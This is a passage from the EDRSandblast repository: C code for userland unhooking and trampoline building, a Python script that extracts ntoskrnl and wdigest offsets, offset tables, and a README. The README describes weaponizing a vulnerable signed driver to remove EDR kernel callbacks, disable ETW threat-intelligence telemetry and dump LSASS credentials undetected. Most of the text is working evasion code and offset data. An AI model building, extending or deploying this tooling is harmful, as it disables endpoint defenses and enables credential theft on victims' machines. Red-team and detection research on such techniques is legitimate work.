    pNtProtectVirtualMemory originalNtProtectVirtualMemory = (pNtProtectVirtualMemory)PE_functionAddr(ntdll_mem, "NtProtectVirtualMemory");
    DWORD oldProtect;
    NTSTATUS status = originalNtProtectVirtualMemory(
        (HANDLE)-1, // GetCurrentProcess()
        &functionStart,
        &functionSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );
    if (!NT_SUCCESS(status)) {
        return EDRSB_NTPROTECTVIRTUALMEMORY_FAILED;
    }

    for (size_t i = 0; i < functionSize; i++) {
        ((PBYTE)functionStart)[i] = ((PBYTE)functionStartOnDisk)[i];
    }

    status = originalNtProtectVirtualMemory(
        (HANDLE)-1, // GetCurrentProcess()
        &functionStart,
        &functionSize,
        oldProtect,
        &oldProtect
    );
    if (!NT_SUCCESS(status)) {
        return EDRSB_NTPROTECTVIRTUALMEMORY_FAILED;
    }

    // Return a pointer to the unhooked function
    *function = functionStart;
    return EDRSB_SUCCESS;
}

//TODO : to move in Core / deduplicate
EDRSB_STATUS _GetSafeNtFunctionUsingTrampoline(BOOL fromEdr, LPCSTR functionName, _Outptr_result_maybenull_ PVOID* function) {
    *function = NULL;

    PE* ntdllPE_mem = NULL;
    PE* ntdllPE_disk = NULL;
    getNtdllPEs(&ntdllPE_mem, &ntdllPE_disk);

    PVOID disk_NtFunction = PE_functionAddr(ntdllPE_disk, functionName);
    PVOID mem_NtFunction = PE_functionAddr(ntdllPE_mem, functionName);

    size_t patchSize = 0;
    PVOID patchAddr = findDiff(mem_NtFunction, disk_NtFunction, PATCH_MAX_SIZE, &patchSize);

    if (patchSize == 0) {
        *function = mem_NtFunction;
        return EDRSB_FUNCTION_NOT_HOOKED;
    }

    if (fromEdr) {
        PVOID trampoline = NULL;
        trampoline = searchTrampolineInExecutableMemory((PBYTE)disk_NtFunction + ((PBYTE)patchAddr - (PBYTE)mem_NtFunction), patchSize, (PBYTE)patchAddr + patchSize);
        if (NULL == trampoline) {
            printf_or_not("Trampoline for %s was impossible to find !\n", functionName);
            return EDRSB_TRAMPOLINE_NOT_FOUND;
        }
        *function = trampoline;
        return EDRSB_SUCCESS;
    }
    else {

#if _WIN64
#define JUMP_SIZE 14
#else
#define JUMP_SIZE 5
#endif
        PBYTE trampoline = VirtualAlloc(NULL, patchSize + JUMP_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (NULL == trampoline) {
            printf_or_not("\tError : VirtualAlloc: 0x%x\n\n", GetLastError());
            return EDRSB_MEMALLOC_FAIL;
        }

        DWORD oldProtect;
        memcpy(trampoline, disk_NtFunction, patchSize);
#if _WIN64
        * ((WORD*)(trampoline + patchSize)) = 0x25FF; //RIP relative jmp
        *((DWORD*)(trampoline + patchSize + 2)) = 0x0; // [RIP + 0]
        *((QWORD*)(trampoline + patchSize + 2 + 4)) = (QWORD)(((BYTE*)mem_NtFunction) + patchSize);
#else
        * (trampoline + patchSize) = 0xE9; //far JMP
        *((DWORD*)(trampoline + patchSize + 1)) = (DWORD)(((DWORD)mem_NtFunction) + patchSize - (((DWORD)trampoline) + patchSize + JUMP_SIZE));
#endif
        VirtualProtect(trampoline, patchSize + JUMP_SIZE, PAGE_EXECUTE_READ, &oldProtect);

        *function = trampoline;
        return EDRSB_SUCCESS;
    }
}


//TODO : to move in Core / deduplicate
EDRSB_STATUS _Usermode_GetSafeNtFunction_with_ntdll_copy(_Inout_ EDRSB_CONTEXT* ctx, _In_z_ const WCHAR* tempDLLFilePath, _In_z_ LPCSTR ntFunctionName, _Outptr_result_maybenull_ PVOID* function) {
    *function = NULL;

    //BUG : cannot change/choose the DLL file path after first call
    HANDLE secondNtdll;
    if (!ctx->Cache.NtdllCopyHandle) {
        WCHAR ntdllFilePath[MAX_PATH] = { 0 };

        GetSystemDirectoryW(ntdllFilePath, _countof(ntdllFilePath));
        PathCombineW(ntdllFilePath, ntdllFilePath, L"ntdll.dll");

        CopyFileW(ntdllFilePath, tempDLLFilePath, FALSE);
        secondNtdll = LoadLibraryW(tempDLLFilePath);
        ctx->Cache.NtdllCopyHandle = secondNtdll;
    }
    secondNtdll = ctx->Cache.NtdllCopyHandle;
    PE* secondNtdll_pe = PE_create(secondNtdll, TRUE);

    PVOID functionAddress = PE_functionAddr(secondNtdll_pe, ntFunctionName);
    PE_destroy(secondNtdll_pe);
    if (functionAddress == NULL) {
        return EDRSB_NT_FUNCTION_NOT_FOUND;
    }
    else {
        *function = functionAddress;
        return EDRSB_SUCCESS;
    }
}

VOID EDRSB_CleanUp(_Inout_ EDRSB_CONTEXT* ctx) {
    if (ctx->Cache.NtdllCopyHandle) {
        FreeLibrary(ctx->Cache.NtdllCopyHandle);
        ctx->Cache.NtdllCopyHandle = NULL;
    }

    if (ctx->isDriverInstalled) {
        CloseDriverHandle();
        BOOL status = UninstallVulnerableDriver();
        if (status == FALSE) {
            _putts_or_not(TEXT("[!] An error occured while attempting to uninstall the vulnerable driver"));
            _tprintf_or_not(TEXT("[*] The service should be manually deleted: cmd /c sc delete %s\n"), GetDriverServiceName());
        }
    }
}



```

`EDRSandblast_StaticLibrary/EDRSandblast_StaticLibrary.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{3a2fcb56-01a3-41b3-bdaa-b25f45784b23}</ProjectGuid>
    <RootNamespace>EDRSandblastStaticLibrary</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>
      </SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>
      </SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <PrecompiledHeaderFile>
      </PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>
      </SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <PrecompiledHeaderFile>
      </PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>
      </SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="EDRSandblast_API.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="EDRSandblast_API.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`EDRSandblast_StaticLibrary/EDRSandblast_StaticLibrary.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="EDRSandblast_API.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="EDRSandblast_API.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Offsets/ExtractOffsets.py`:

```py
import argparse
import csv
import os
import sys

from requests import get
from gzip import decompress
from json import loads, dumps
import subprocess

from concurrent.futures import ThreadPoolExecutor
import threading
CSVLock = threading.Lock()

machineType = dict(x86=332, x64=34404)
knownImageVersions = dict(ntoskrnl=list(), wdigest=list())
extensions_by_mode = dict(ntoskrnl="exe", wdigest="dll")

def run(args, **kargs):
    """Wrap subprocess.run to works on Windows and Linux"""
    # Windows needs shell to be True, to locate binary automatically
    # On Linux, shell needs to be False to manage lists in args
    shell = sys.platform in ["win32"]
    return subprocess.run(args, shell=shell, **kargs)

def downloadSpecificFile(entry, pe_basename, pe_ext, knownPEVersions, output_folder):
    pe_name = f'{pe_basename}.{pe_ext}'

    if 'fileInfo' not in entry:
        # print(f'[!] Entry {pe_hash} has no fileInfo, skipping it.')
        return "SKIP"
    if 'timestamp' not in entry['fileInfo']:
        # print(f'[!] Entry {pe_hash} has no timestamp, skipping it.')
        return "SKIP"
    timestamp = entry['fileInfo']['timestamp']
    if 'virtualSize' not in entry['fileInfo']:
        # print(f'[!] Entry {pe_hash} has no virtualSize, skipping it.')
        return "SKIP"
    if "machineType" not in entry["fileInfo"] or entry["fileInfo"]["machineType"] != machineType["x64"]:
        return "SKIP"
    virtual_size = entry['fileInfo']['virtualSize']
    file_id = hex(timestamp).replace('0x','').zfill(8).upper() + hex(virtual_size).replace('0x','')
    url = 'https://msdl.microsoft.com/download/symbols/' + pe_name + '/' + file_id + '/' + pe_name
    version = entry['fileInfo']['version'].split(' ')[0]
    
    # Output file format: <PE>_build-revision.<exe | dll>
    output_version = '-'.join(version.split('.')[-2:])
    output_file = f'{pe_basename}_{output_version}.{pe_ext}'
    
    # If the PE version is already known, skip download.
    if output_file in knownPEVersions:
        print(f'[*] Skipping download of known {pe_name} version: {output_file}')
        return "SKIP"
    
    output_file_path = os.path.join(output_folder, output_file)
    if os.path.isfile(output_file_path):
        print(f"[*] Skipping {output_file_path} which already exists")
        return "SKIP"
    
    print(f'[*] Downloading {pe_name} version {version}... ')
    try:
        peContent = get(url)
        with open(output_file_path, 'wb') as f:
            f.write(peContent.content)
        print(f'[+] Finished download of {pe_name} version {version} (file: {output_file})!')
        return "OK"
    except Exception:
        print(f'[!] ERROR : Could not download {pe_name} version {version} (URL: {url}).')
        return "KO"

def downloadPEFileFromMS(pe_basename, pe_ext, knownPEVersions, output_folder):
    pe_name = f'{pe_basename}.{pe_ext}'

    print (f'[*] Downloading {pe_name} files!')

    pe_json_gz = get(f'https://winbindex.m417z.com/data/by_filename_compressed/{pe_name}.json.gz').content
    pe_json = decompress(pe_json_gz)
    pe_list = loads(pe_json)

    futures = dict()
    with ThreadPoolExecutor() as executor:
        for pe_hash in pe_list:
            entry = pe_list[pe_hash]
            futures[pe_hash] = executor.submit(downloadSpecificFile,entry, pe_basename, pe_ext, knownPEVersions, output_folder)
    for (i,f) in enumerate(futures):
        res = futures[f].result()
        print(f"{i+1}/{len(futures)}", end="\r")

def get_symbol_offset(symbols_info, symbol_name):
    for line in symbols_info:
        # sometimes, a "_" is prepended to the symbol name ...
        if line.strip().split(" ")[-1].endswith(symbol_name):
            return int(line.split(" ")[0], 16)
    else:
        return 0

def get_field_offset(symbols_info, field_name):
    for line in symbols_info:
        if field_name in line:
            assert "offset" in line
            symbol_offset = int(line.split("+")[-1], 16)
            return symbol_offset
    else:
        return 0

def get_file_version(path):
    # dump version number using r2
    r = run(["r2", "-c", "iV", "-qq", path], capture_output=True)
    for line in r.stdout.decode().splitlines():
        line = line.strip()
        if line.startswith("FileVersion:"):
            return [int(frag) for frag in line.split(" ")[-1].split(".")]

    print(f'[!] ERROR : failed to extract version from {path}.')
    raise RuntimeError("get_file_version error")

def extractOffsets(input_file, output_file, mode):
    if os.path.isfile(input_file):
        try:
            # check image type (ntoskrnl, wdigest, etc.)
            r = run(["r2", "-c", "iE", "-qq", input_file], capture_output=True)
            for line in r.stdout.decode().splitlines():
                if "ntoskrnl.exe" in line:
                    imageType = "ntoskrnl"
                    break
                elif "wdigest.dll" in line:
                    imageType = "wdigest"
                    break
            else:
                print(f"[*] File {input_file} unrecognized")
                return 
            
            #todo : remove this and make a unique function
            if mode != imageType:
                print(f"[*] Skipping {input_file} since we are in {mode} mode")
                return
            if os.path.sep not in input_file:
                input_file = "." + os.path.sep + input_file
            full_version = get_file_version(input_file)
            
            # Checks if the image version is already present in the CSV
            extension = extensions_by_mode[imageType]
            imageVersion = f'{imageType}_{full_version[2]}-{full_version[3]}.{extension}'
            
            if imageVersion in knownImageVersions[imageType]:
                print(f'[*] Skipping known {imageType} version {imageVersion} (file: {input_file})')
                return
            
            
            print(f'[*] Processing {imageType} version {imageVersion} (file: {input_file})')
            # download the PDB if needed
            r = run(["r2", "-c", "idpd", "-qq", input_file], capture_output=True)
            # dump all symbols
            r = run(["r2", "-c", "idpi", "-qq", '-B', '0', input_file], capture_output=True)
            all_symbols_info = [line.strip() for line in r.stdout.decode().splitlines()]

            if imageType == "ntoskrnl":
                symbols = [("PspCreateProcessNotifyRoutine",get_symbol_offset), 
                            ("PspCreateThreadNotifyRoutine",get_symbol_offset), 
                            ("PspLoadImageNotifyRoutine", get_symbol_offset),
                            ('_PS_PROTECTION Protection', get_field_offset),
                            ("EtwThreatIntProvRegHandle", get_symbol_offset),
                            ('_ETW_GUID_ENTRY* GuidEntry', get_field_offset),
                            ('_TRACE_ENABLE_INFO ProviderEnableInfo', get_field_offset),
                            ("PsProcessType", get_symbol_offset),
                            ("PsThreadType", get_symbol_offset),
                            ('struct _LIST_ENTRY CallbackList', get_field_offset)]
            elif imageType == "wdigest":
                symbols = [
                ("g_fParameter_UseLogonCredential",get_symbol_offset), 
                ("g_IsCredGuardEnabled",get_symbol_offset)
                ]
                            
                
            symbols_values = list()
            for symbol_name, get_offset in symbols:
                symbol_value = get_offset(all_symbols_info, symbol_name)
                symbols_values.append(symbol_value)
                #print(f"[+] {symbol_name} = {hex(symbol_value)}") 
            
            with CSVLock:
                with open(output_file, 'a') as output:
                    output.write(f'{imageVersion},{",".join(hex(val).replace("0x","") for val in symbols_values)}\n')
            
            #print("wrote into CSV !")

            knownImageVersions[imageType].append(imageVersion)
            
            print(f'[+] Finished processing of {imageType} {input_file}!')

        except Exception as e:
            print(f'[!] ERROR : Could not process file {input_file}.')
            print(f'[!] Error message: {e}')
            print(f'[!] If error is of the like of "\'NoneType\' object has no attribute \'group\'", kernel callbacks may not be supported by this version.')

    elif os.path.isdir(input_file):
        print(f'[*] Processing folder: {input_file}')
        with ThreadPoolExecutor() as extractorPool:
            args = [(os.path.join(input_file, file), output_file, mode) for file in os.listdir(input_file)]
            for (i,res) in enumerate(extractorPool.map(extractOffsets, *zip(*args))):
                print(f"{i+1}/{len(args)}", end="\r")
        print(f'[+] Finished processing of folder {input_file}!')

    else:
        print(f'[!] ERROR : The specified input {input_file} is neither a file nor a directory.')



def loadOffsetsFromCSV(loadedVersions, CSVPath):
    print(f'[*] Loading the known known PE versions from "{CSVPath}".')
    
    with open(CSVPath, "r") as csvFile:
        csvReader = csv.reader(csvFile, delimiter=',')
        next(csvReader)
        for peLine in csvReader:
            loadedVersions.append(peLine[0])


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    
    parser.add_argument('mode', help='ntoskrnl or wdigest. Mode to download and extract offsets for either ntoskrnl or wdigest')
    parser.add_argument('-i', '--input', dest='input', required=True,
                        help='Single file or directory containing ntoskrnl.exe / wdigest.dll to extract offsets from. If in download mode, the PE downloaded from MS symbols servers will be placed in this folder.')
    parser.add_argument('-o', '--output', dest='output', 
                        help='CSV file to write offsets to. If the specified file already exists, only new ntoskrnl versions will be downloaded / analyzed. Defaults to NtoskrnlOffsets.csv / WdigestOffsets.csv in the current folder.')
    parser.add_argument('-d', '--download', dest='download', action='store_true',
                        help='Flag to download the PE from Microsoft servers using list of versions from winbindex.m417z.com.')
    
    args = parser.parse_args()
    mode = args.mode.lower()
    if mode not in knownImageVersions:
        print(f'[!] ERROR : unsupported mode "{args.mode}", supported mode are: "ntoskrnl" and "wdigest"')      
        exit(1)
    
    # check R2 version
    r = run(["r2", "-V"], capture_output=True)
    if r.returncode != 0:
        print(f"Error: the following error message was printed while running 'r2 -V':")
        print(r.stderr)
        exit(r.returncode)
    output = r.stdout.decode()
    ma,me,mi = map(int, output.splitlines()[0].split(" ")[0].split("."))
    if (ma, me, mi) < (5,0,0):
        print("WARNING : This script has been tested with radare2 5.0.0 (works) and 4.3.1 (does NOT work)")
        print(f"You have version {ma}.{me}.{mi}, if is does not work correctly, meaning most of the offsets are not found (i.e. 0), check radare2's 'idpi' command output and modify get_symbol_offset() & get_field_offset() to parse symbols correctly")
        input("Press enter to continue")
    if sys.platform in ["linux"]:
        # check that cabextract is insalled
        try:
            run(["cabextract", "-v"], check=True, capture_output=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print('[!] ERROR : On Linux systems, radare2 needs cabextract to be installed to work with PDB.')
            exit(1)
        if "R2_CURL" not in os.environ:
            print("WARNING : On Linux systems, radare2 may have trouble to download PDB files. If offsets are reported as 0, export R2_CURL=1 prior to running the script.")
    
    
    # If the output file exists, load the already analyzed image versions.
    # Otherwise, write CSV headers to the new file.
    if not args.output:
        args.output = mode.capitalize() + 'Offsets.csv'
    if os.path.isfile(args.output):
        loadOffsetsFromCSV(knownImageVersions[mode], args.output)
        print(f'[+] Loaded {len(knownImageVersions[mode])} known {mode} versions from "{args.output}"')
    else:
        with open(args.output, 'w') as output:
            if mode == "ntoskrnl":
                output.write('ntoskrnlVersion,PspCreateProcessNotifyRoutineOffset,PspCreateThreadNotifyRoutineOffset,PspLoadImageNotifyRoutineOffset,_PS_PROTECTIONOffset,EtwThreatIntProvRegHandleOffset,EtwRegEntry_GuidEntryOffset,EtwGuidEntry_ProviderEnableInfoOffset,PsProcessType,PsThreadType,CallbackList\n')
            elif mode == "wdigest":
                output.write('wdigestVersion,g_fParameter_UseLogonCredentialOffset,g_IsCredGuardEnabledOffset\n')
            else:
                assert False
    # In download mode, an updated list of image versions published will be retrieved from https://winbindex.m417z.com.
    # The symbols for each version will be downloaded from the Microsoft symbols servers.
    # Only new versions will be downloaded if the specified output file already contains offsets.
    if (args.download):
        if not os.path.isdir(args.input):
            print('[!] ERROR : in download mode, -i / --input option must specify a folder')
            exit(1)
        extension = extensions_by_mode[mode]
        downloadPEFileFromMS(mode, extension, knownImageVersions[mode], args.input)
    
    # Extract the offsets from the specified file or the folders containing image files. 
    extractOffsets(args.input, args.output, mode)

```

`Offsets/NtoskrnlOffsets.csv`:

```csv
CSV Schema (1 sample row):
Headers: ntoskrnlVersion, PspCreateProcessNotifyRoutineOffset, PspCreateThreadNotifyRoutineOffset, PspLoadImageNotifyRoutineOffset, _PS_PROTECTIONOffset, EtwThreatIntProvRegHandleOffset, EtwRegEntry_GuidEntryOffset, EtwGuidEntry_ProviderEnableInfoOffset, PsProcessType, PsThreadType, CallbackList
Sample: "ntoskrnl_19041-1889.exe", "cec060", "cec460", "cec260", "87a", "c19dd8", "20", "60", "cfc410", "cfc440", "c8"
... [517 more rows omitted]

```

`Offsets/WdigestOffsets.csv`:

```csv
CSV Schema (1 sample row):
Headers: wdigestVersion, g_fParameter_UseLogonCredentialOffset, g_IsCredGuardEnabledOffset
Sample: "wdigest_10240-18244.dll", "35144", "34ba0"
... [33 more rows omitted]

```

`Offsets/requirements.txt`:

```txt
requests

```

`README.md`:

```md
# EDRSandBlast

`EDRSandBlast` is a tool written in `C` that weaponize a vulnerable signed
driver to bypass EDR detections (Notify Routine callbacks, Object Callbacks
and `ETW TI` provider) and `LSASS` protections. Multiple userland unhooking
techniques are also implemented to evade userland monitoring.

As of release, combination of userland (`--usermode`) and Kernel-land
(`--kernelmode`) techniques were used to dump `LSASS` memory under EDR
scrutiny, without being blocked nor generating "OS Credential Dumping"-related
events in the product (cloud) console. The tests were performed on 3 distinct
EDR products and were successful in each case.

## Description

### EDR bypass through Kernel Notify Routines removal

EDR products use Kernel "Notify Routines" callbacks on Windows to be notified by the kernel of
system activity, such as process and thread creation and loading of images
(`exe` / `DLL`).

These Kernel callbacks are defined from kernel-land, usually from the driver implementing the callbacks, using a number of documented
APIs (`nt!PsSetCreateProcessNotifyRoutine`, `nt!PsSetCreateThreadNotifyRoutine`,
etc.). These APIs add driver-supplied callback routines to undocumented
arrays of routines in Kernel-space:
  - `PspCreateProcessNotifyRoutine` for process creation
  - `PspCreateThreadNotifyRoutine` for thread creation
  - `PspLoadImageNotifyRoutine` for image loading

`EDRSandBlast` enumerates the routines defined in those arrays and remove any
callback routine linked to a predefined list of EDR drivers (more than 1000
 drivers of security products supported, see the [EDR driver detection section](#edr-drivers-and-processes-detection).
The enumeration and removal are made possible through the exploitation of an
arbitrary Kernel memory read / write primitive provided by the exploitation of a vulnerable driver (see [Vulnerable drivers section](#vulnerable-drivers-detection)).

The offsets of the aforementioned arrays are recovered using multiple techniques, please refer to [Offsets section](#ntoskrnl-and-wdigest-offsets).

### EDR bypass through Object Callbacks removal
EDR (and even EPP) products often register "Object callbacks" through the use of the
`nt!ObRegisterCallbacks` kernel API. These callbacks allow the security product to
be notified at each handle generation on specific object types (Processes, Threads and
Desktops related object callbacks are now supported by Windows). A handle generation
may occur on object opening (call to `OpenProcess`, `OpenThread`, etc.) as well as
handle duplication (call to `DuplicateHandle`, etc.).

By being notified by the kernel on each of these operations, a security product may
analyze the legitimacy of the handle creation (*e.g. an unknown process is trying to open
LSASS*), and even block it if a threat is detected.

At each callback registration using `ObRegisterCallbacks`, a new item is added to
the `CallbackList` double-linked list present in the `_OBJECT_TYPE` object describing
the type of object affected by the callback (either a Process, a Thread or a Desktop).
Unfortunately, these items are described by a structure that is not documented nor
published in symbol files by Microsoft. However, studying it from various `ntoskrnl.exe`
versions seems to indicate that the structure did not change between (at least) Windows
10 builds 10240 and 22000 (from 2015 to 2022).

The mentionned structure, representing an object callback registration, is the following:
```C
typedef struct OB_CALLBACK_ENTRY_t {
    LIST_ENTRY CallbackList; // linked element tied to _OBJECT_TYPE.CallbackList
    OB_OPERATION Operations; // bitfield : 1 for Creations, 2 for Duplications
    BOOL Enabled;            // self-explanatory
    OB_CALLBACK* Entry;      // points to the structure in which it is included
    POBJECT_TYPE ObjectType; // points to the object type affected by the callback
    POB_PRE_OPERATION_CALLBACK PreOperation;      // callback function called before each handle operation
    POB_POST_OPERATION_CALLBACK PostOperation;     // callback function called after each handle operation
    KSPIN_LOCK Lock;         // lock object used for synchronization
} OB_CALLBACK_ENTRY;
```
The `OB_CALLBACK` structure mentionned above is also undocumented, and is defined
by the following:
```C
typedef struct OB_CALLBACK_t {
    USHORT Version;                           // usually 0x100
    USHORT OperationRegistrationCount;        // number of registered callbacks
    PVOID RegistrationContext;                // arbitrary data passed at registration time
    UNICODE_STRING AltitudeString;            // used to determine callbacks order
    struct OB_CALLBACK_ENTRY_t EntryItems[1]; // array of OperationRegistrationCount items
    WCHAR AltitudeBuffer[1];                  // is AltitudeString.MaximumLength bytes long, and pointed by AltitudeString.Buffer
} OB_CALLBACK;
```

In order to disable EDR-registered object callbacks, three techniques are implemented in
`EDRSandblast`; however only one is enabled for the moment.

#### Using the `Enabled` field of `OB_CALLBACK_ENTRY`
This is the default technique enabled in `EDRSandblast`. In order to detect and disable
EDR-related object callbacks, the `CallbackList` list located in the `_OBJECT_TYPE`
objects tied to the *Process* and *Thread* types is browsed. Both `_OBJECT_TYPE`s are
pointed by public global symbols in the kernel, `PsProcessType` and `PsThreadType`.

Each item of the list is assumed to fit the `OB_CALLBACK_ENTRY` structure described above
(assumption that seems to hold at least in all Windows 10 builds at the time of writing).
Functions defined in `PreOperation` and `PostOperation` fields are located to checks
if they belong to an EDR driver, and if so, callbacks are simply disabled toggling the `Enabled`
flag.

While being a pretty safe technique, it has the inconvenient of relying on an undocumented
structure; to reduce the risk of unsafe manipulation of this structure, basic checks are
performed to validate that some fields have the expected values :
